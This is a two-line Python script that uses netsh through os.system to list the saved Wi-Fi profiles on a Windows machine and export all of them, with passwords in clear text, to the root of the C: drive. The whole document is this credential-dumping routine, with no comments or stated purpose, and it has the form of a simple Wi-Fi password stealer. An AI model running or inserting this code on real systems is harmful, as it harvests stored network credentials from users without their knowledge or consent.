import os

os.system("netsh wlan show profile")
os.system("netsh wlan export profile folder=C:\ key=clear")

